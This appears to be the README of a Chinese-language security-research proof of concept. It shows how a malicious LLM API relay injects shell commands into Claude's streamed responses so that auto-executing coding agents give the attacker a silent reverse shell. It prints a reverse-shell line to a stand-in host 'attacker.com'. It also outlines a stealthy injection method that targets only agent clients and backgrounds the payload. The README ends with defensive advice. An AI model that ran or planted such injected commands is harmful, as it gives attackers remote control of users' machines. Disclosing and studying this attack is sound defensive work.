# LLMRelayServAttack

> **声明：本项目仅用于安全研究与漏洞预警。所有测试均在自有服务器及自有账号上进行，不涉及任何真实用户数据。请勿将本项目用于任何未授权的攻击行为。**

## 项目简介

本项目是一个针对 **LLM 第三方中转站** 的供应链投毒攻击研究 PoC（Proof of Concept）。

演示了恶意中转站如何利用其 MITM（中间人）位置，在 Claude 流式响应中注入恶意 Bash 命令，并借助 **Claude Code**、**OpenClaw** 等 AI 编程工具的**自动执行特性**，实现对用户主机的**零点击 RCE（远程命令执行）**。

![演示：OpenClaw 被注入，攻击者静默获取 shell](articles/ai-relay-poisoning-warning.assets/litsten_data2-17731842777922.gif)

> 用户在 OpenClaw 中输入「查看当前文件夹下的文件」，AI 执行 `ls` 的同时，中转站注入的反弹 shell 静默上线。全程无任何弹窗，无任何确认。

---

## 威胁模型

```
用户（受害者）
    │  配置 API Base URL 指向第三方中转站
    ▼
┌─────────────────────────────────────┐
│       恶意中转服务（投毒）            │
│                                     │
│  普通手动用户：透明转发，不注入       │
│  AI Agent 用户：篡改响应，注入命令   │
└──────────────────┬──────────────────┘
                   │
                   ▼
           Claude 官方 API
```

### 为什么 AI Agent 用户是高价值目标

| 工具 | 执行方式 | 危险等级 |
|------|---------|---------|
| Claude Code（agent 模式） | 调用 Bash tool，**自动执行，零确认** | ⚠️ 最高 |
| OpenClaw / 小龙虾 | 默认开启自动执行，无需用户操作 | ⚠️ 最高 |
| Claude Code（对话模式） | 生成脚本，用户手动复制执行 | 高 |
| 普通 API 调用 | 开发者手动审查 | 低 |

---

## 攻击原理

Claude 的流式响应（SSE）格式如下：

```
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"ls -la\n"}}
```

恶意中转站可以实时解析每一个 SSE chunk，在检测到 bash 代码块结束时，追加注入 payload：

```bash
# 正常 AI 生成内容
ls -la

# 注入内容（用户不可见）
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

由于 Claude Code 和 OpenClaw 会**自动执行** AI 返回的 bash 脚本，注入的反弹 shell 命令会在用户毫无感知的情况下运行。

---

## 项目结构

```
├── ATTACK_PLAN.md              # 完整攻击方案文档（含代码级修改细节）
├── IMPLEMENTATION_NOTES.md     # 实施笔记与源码校验记录
├── articles/                   # 预警文章（面向普通用户）
│   └── ai-relay-poisoning-warning.md
├── articles-old/               # 旧版文章与配图
│   └── diagrams/               # 攻击链路图（drawio/svg）
├── claude-relay-service/       # 改造版中转服务（展示注入点）
│   └── src/utils/evilInjector.js   # 核心注入逻辑
├── test_script/                # 测试脚本
│   ├── test_evil_inject.py     # 验证注入效果
│   ├── test_relay.py           # 正常转发测试
│   └── test_normal.py          # 对照组测试
└── nc-test/                    # 反弹 shell 接收端测试
    └── multi_handler.py        # 多连接监听器
```

---

## 核心注入逻辑

注入点位于 `claude-relay-service/src/utils/evilInjector.js`，主要逻辑：

1. **精准识别目标**：只对 Claude Code / OpenClaw 等 AI Agent 客户端注入，普通用户透明转发，降低被发现概率
2. **SSE 流实时解析**：逐 chunk 解析流式响应，检测 bash 代码块边界
3. **尾部注入**：在 bash 代码块结束前插入 payload，保证语法合法
4. **隐蔽执行**：payload 通过 `&` 后台运行，不阻塞原始命令，用户界面无异常

---

## 影响范围

- **高风险用户**：在 Claude Code、OpenClaw 等工具中使用过第三方中转站 API 的开发者
- **高风险场景**：让 AI agent 执行系统命令、编写并运行 shell 脚本
- **波及工具**：任何将 AI 返回内容自动执行的客户端

---

## 防御建议

1. **只使用官方 API**：`https://api.anthropic.com`，不要使用来源不明的第三方中转站
2. **审查自动执行**：在 Claude Code 中关闭 auto-approve，对每条 bash 命令手动确认
3. **网络隔离**：在沙箱或容器中运行 AI agent，限制出站连接
4. **验证中转站**：如必须使用中转，选择开源、可自部署、代码可审计的方案

---

## 相关文章

- [用了第三方 API 中转站？你的电脑可能已经被人远程控制了](articles/ai-relay-poisoning-warning.md)

---

## License

本项目仅供安全研究使用，禁止用于任何未授权的攻击行为。
